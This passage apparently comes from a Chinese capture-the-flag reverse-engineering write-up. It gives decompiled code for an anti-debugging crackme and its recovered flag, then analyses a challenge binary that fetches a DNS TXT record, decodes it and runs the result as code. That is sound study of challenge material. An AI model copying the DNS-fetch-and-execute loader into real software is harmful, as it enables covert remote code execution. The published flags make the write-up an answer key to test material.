class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__pid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">bool</span> v6; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v7; <span class="comment">// [rsp+0h] [rbp-1D0h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+13h] [rbp-1BDh]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v9; <span class="comment">// [rsp+18h] [rbp-1B8h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v10; <span class="comment">// [rsp+18h] [rbp-1B8h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+20h] [rbp-1B0h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">200</span>]; <span class="comment">// [rsp+F0h] [rbp-E0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+1B8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = argv;</span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v8 = (<span class="keyword">unsigned</span> __int8)detectDebugging();</span><br><span class="line">  <span class="keyword">if</span> ( pipe(pParentWrite) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( pipe(pParentRead) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  v3 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v3 != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">close</span>(pParentWrite[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">close</span>(dword_6DA554);</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Input key : "</span>, v7);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;buf, <span class="string">'\0'</span>, <span class="number">200u</span>LL);</span><br><span class="line">        gets(&amp;buf, <span class="string">'\0'</span>);</span><br><span class="line">        v4 = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line">        v5 = <span class="built_in">write</span>(fd, &amp;buf, v4);               <span class="comment">// 将输入的buf值写入fd</span></span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="built_in">strlen</span>(&amp;buf) )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"parent - partial/failed write"</span>, &amp;buf);</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">200u</span>LL);</span><br><span class="line">          v10 = <span class="built_in">read</span>(pParentRead[<span class="number">0</span>], s, <span class="number">200u</span>LL);<span class="comment">// 从pParentRead[]中读200个字符到s数组</span></span><br><span class="line">          v6 = (_BYTE)v8 || (<span class="keyword">unsigned</span> __int8)checkDebuggerProcessRunning();</span><br><span class="line">          <span class="keyword">if</span> ( v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Wrong !!!\n"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)checkStringIsNumber(s) ^ <span class="number">1</span> )<span class="comment">// 要求不是数字</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Wrong !!!\n"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( atoi(s) )                      <span class="comment">// atoi函数把字符串转换成整型数</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">puts</span>(<span class="string">"True"</span>);</span><br><span class="line">              <span class="keyword">if</span> ( <span class="built_in">close</span>(fd) == <span class="number">-1</span> )</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">              <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Wrong !!!\n"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v10 == <span class="number">-1</span> );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="built_in">close</span>(pParentRead[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">200u</span>LL);</span><br><span class="line">      v9 = <span class="built_in">read</span>(pParentWrite[<span class="number">0</span>], s, <span class="number">200u</span>LL);</span><br><span class="line">      <span class="keyword">if</span> ( v9 == <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)childCheckDebugResult() )</span><br><span class="line">        &#123;</span><br><span class="line">          responseFalse();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="string">'&#123;'</span> )                 <span class="comment">// &#123;53fc275d81&#123;len(20)&#125;4938ae4efd</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) == <span class="number">42</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s[<span class="number">1</span>], <span class="string">"53fc275d81"</span>, <span class="number">10u</span>LL) )<span class="comment">// 1-10: '53fc275d81'</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( s[<span class="built_in">strlen</span>(s) - <span class="number">1</span>] == <span class="string">'&#125;'</span> )    <span class="comment">// 以'&#125;'结尾</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s[<span class="number">31</span>], <span class="string">"4938ae4efd"</span>, <span class="number">10u</span>LL) )<span class="comment">// 31-40: '4938ae4efd'</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)confuseKey(s, <span class="number">42</span>) ^ <span class="number">1</span> )<span class="comment">//将s交换顺序，1234 --&gt; 3412</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    responseFalse();</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s, <span class="string">"&#123;daf29f59034938ae4efd53fc275d81053ed5be8c&#125;"</span>, <span class="number">42u</span>LL) )<span class="comment">// 交换完顺序之后要是这个</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    responseTrue();</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    responseFalse();</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  responseFalse();</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                responseFalse();</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              responseFalse();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            responseFalse();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          responseFalse();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>confuseKey()：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">confuseKey</span><span class="params">(<span class="keyword">char</span> *a1_s, <span class="keyword">int</span> a2_42)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  __int16 v5; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+1Eh] [rbp-42h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  __int16 v9; <span class="comment">// [rsp+2Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+2Eh] [rbp-32h]</span></span><br><span class="line">  <span class="keyword">char</span> v11[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int16 v13; <span class="comment">// [rsp+3Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+3Eh] [rbp-22h]</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  __int16 v17; <span class="comment">// [rsp+4Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+4Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v19; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)dest = <span class="number">0L</span>L;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)v7 = <span class="number">0L</span>L;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)v11 = <span class="number">0L</span>L;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)v15 = <span class="number">0L</span>L;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2_42 != <span class="number">42</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( !a1_s )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1_s) != <span class="number">42</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( *a1_s != <span class="string">'&#123;'</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, a1_s + <span class="number">1</span>, <span class="number">10u</span>LL);               <span class="comment">// s前十位至dest</span></span><br><span class="line">  <span class="built_in">strncpy</span>(v7, a1_s + <span class="number">11</span>, <span class="number">10u</span>LL);                <span class="comment">// 11-20位至v7</span></span><br><span class="line">  <span class="built_in">strncpy</span>(v11, a1_s + <span class="number">21</span>, <span class="number">0xA</span>uLL);              <span class="comment">// 21-30位至v11</span></span><br><span class="line">  <span class="built_in">strncpy</span>(v15, a1_s + <span class="number">31</span>, <span class="number">0xA</span>uLL);              <span class="comment">// 31-40位至v15</span></span><br><span class="line">  <span class="built_in">memset</span>(a1_s, <span class="number">0</span>, a2_42);                       <span class="comment">// 把s清空</span></span><br><span class="line">  *a1_s = <span class="number">123</span>;</span><br><span class="line">  <span class="built_in">strcat</span>(a1_s, v11);                            <span class="comment">// 1234 --&gt; 3412</span></span><br><span class="line">  <span class="built_in">strcat</span>(a1_s, v15);</span><br><span class="line">  <span class="built_in">strcat</span>(a1_s, dest);</span><br><span class="line">  <span class="built_in">strcat</span>(a1_s, v7);</span><br><span class="line">  a1_s[<span class="number">41</span>] = <span class="string">'&#125;'</span>;                               <span class="comment">// 再赋值给s</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交换一下顺序即可，flag为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53fc275d81053ed5be8cdaf29f59034938ae4efd</span><br></pre></td></tr></table></figure><hr><h1>re9 The_Maya_Society</h1><p>这个题有点脑洞，打开有个网页Maya society，然后有个elf文件。</p><p>IDA打开很容易发现main函数逻辑，经过分析，主要功能是md5加密当前时间，然后拼接后面的 “.fluxfingers.net” 字符串，请求拼接好的域名的DNS TXT解析记录，然后base64解码，再与0x25异或即为flag。</p><p>请求中间有个sub_18A4函数开始没看懂，最后才知道应该是网络通信相关的函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">time_t</span> timer; <span class="comment">// [rsp+18h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">char</span> v11[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">char</span> src; <span class="comment">// [rsp+40h] [rbp-100h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+60h] [rbp-E0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v14; <span class="comment">// [rsp+C8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+D4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+DDh] [rbp-63h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+E6h] [rbp-5Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+EFh] [rbp-51h]</span></span><br><span class="line">  <span class="keyword">char</span> *v19; <span class="comment">// [rsp+F8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// [rsp+100h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> *v21; <span class="comment">// [rsp+108h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+110h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> *v23; <span class="comment">// [rsp+118h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v24; <span class="comment">// [rsp+120h] [rbp-20h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tp</span>;</span> <span class="comment">// [rsp+128h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v11, <span class="string">".fluxfingers.net"</span>);</span><br><span class="line">  timer = time(<span class="number">0L</span>L);</span><br><span class="line">  tp = localtime(&amp;timer);</span><br><span class="line">  strftime(&amp;s, <span class="number">99u</span>LL, <span class="string">"%Y-%m-%d"</span>, tp);</span><br><span class="line">  v24 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  md5_func(&amp;s, v24);                            <span class="comment">// md5加密当前时间，得到的几组数为md5算法输出的级联</span></span><br><span class="line">  v23 = (<span class="keyword">int</span> *)&amp;qword_2030B8;</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    &amp;v18,</span><br><span class="line">    <span class="number">9u</span>LL,</span><br><span class="line">    <span class="string">"%02x%02x%02x%02x"</span>,</span><br><span class="line">    (<span class="keyword">unsigned</span> __int8)qword_2030B8,              <span class="comment">// 这几个数字是md5的标志 A,B,C,D</span></span><br><span class="line">    BYTE1(qword_2030B8),</span><br><span class="line">    BYTE2(qword_2030B8),</span><br><span class="line">    BYTE3(qword_2030B8));</span><br><span class="line">  v23 = &amp;dword_2030C0;</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    &amp;v17,</span><br><span class="line">    <span class="number">9u</span>LL,</span><br><span class="line">    <span class="string">"%02x%02x%02x%02x"</span>,</span><br><span class="line">    (<span class="keyword">unsigned</span> __int8)dword_2030C0,</span><br><span class="line">    BYTE1(dword_2030C0),</span><br><span class="line">    BYTE2(dword_2030C0),</span><br><span class="line">    HIBYTE(dword_2030C0));</span><br><span class="line">  v23 = &amp;dword_2030B4;</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    &amp;v16,</span><br><span class="line">    <span class="number">9u</span>LL,</span><br><span class="line">    <span class="string">"%02x%02x%02x%02x"</span>,</span><br><span class="line">    (<span class="keyword">unsigned</span> __int8)dword_2030B4,</span><br><span class="line">    BYTE1(dword_2030B4),</span><br><span class="line">    BYTE2(dword_2030B4),</span><br><span class="line">    HIBYTE(dword_2030B4));</span><br><span class="line">  v23 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;qword_2030B8 + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    &amp;v15,</span><br><span class="line">    <span class="number">9u</span>LL,</span><br><span class="line">    <span class="string">"%02x%02x%02x%02x"</span>,</span><br><span class="line">    BYTE4(qword_2030B8),</span><br><span class="line">    BYTE5(qword_2030B8),</span><br><span class="line">    BYTE6(qword_2030B8),</span><br><span class="line">    HIBYTE(qword_2030B8));</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;src, <span class="number">33u</span>LL, <span class="string">"%s%s%s%s"</span>, &amp;v18, &amp;v17, &amp;v16, &amp;v15);<span class="comment">// src为md5加密后的结果</span></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;src);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(v11);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v3 + v4 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !dest )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  *dest = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcat</span>(dest, &amp;src);                           <span class="comment">// 连接src和v11，组成新字符串</span></span><br><span class="line">  <span class="built_in">strcat</span>(dest, v11);                            <span class="comment">// v11 == ".fluxfingers.net"</span></span><br><span class="line">  v21 = sub_18A4(dest);                         <span class="comment">// 这个函数暂时没搞懂干啥的</span></span><br><span class="line">  <span class="keyword">if</span> ( !v21 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(v21);</span><br><span class="line">  v20 = base64((__int64)v21, v6, &amp;v14);         <span class="comment">// base64解码</span></span><br><span class="line">  v7 = <span class="built_in">strlen</span>(v21);</span><br><span class="line">  v19 = base64((__int64)v21, v7, &amp;v14);</span><br><span class="line">  <span class="keyword">if</span> ( !v20 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  v8 = v14;</span><br><span class="line">  v9 = v20;</span><br><span class="line">  sub_1858((__int64)v20, v14, (__int64)v19);    <span class="comment">// 又异或了一波</span></span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">unsigned</span> __int64))v19)(v9, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_1858：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_1858</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+20h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a3 + i) = *(_BYTE *)(a1 + i) ^ <span class="number">0x25</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_18A4:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_18A4</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  ns_rr v3; <span class="comment">// [rsp+10h] [rbp-24A0h]</span></span><br><span class="line">  ns_msg v4; <span class="comment">// [rsp+430h] [rbp-2080h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+480h] [rbp-2030h]</span></span><br><span class="line">  u_char v6; <span class="comment">// [rsp+1480h] [rbp-1030h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+2488h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">size_t</span> n; <span class="comment">// [rsp+2490h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [rsp+2498h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *src; <span class="comment">// [rsp+24A0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+24ACh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __res_query(a1, <span class="number">1</span>, <span class="number">16</span>, &amp;v6, <span class="number">4096</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v11 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  ns_initparse(&amp;v6, v11, &amp;v4);</span><br><span class="line">  v11 = v4._counts[<span class="number">1</span>];</span><br><span class="line">  ns_parserr(&amp;v4, ns_s_an, <span class="number">0</span>, &amp;v3);</span><br><span class="line">  ns_sprintrr(&amp;v4, &amp;v3, <span class="number">0L</span>L, <span class="number">0L</span>L, &amp;s, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v2 = <span class="built_in">strchr</span>(&amp;s, <span class="number">34</span>);</span><br><span class="line">  src = v2 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == (<span class="keyword">char</span> *)<span class="number">-1L</span>L )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v9 = <span class="built_in">strchr</span>(src, <span 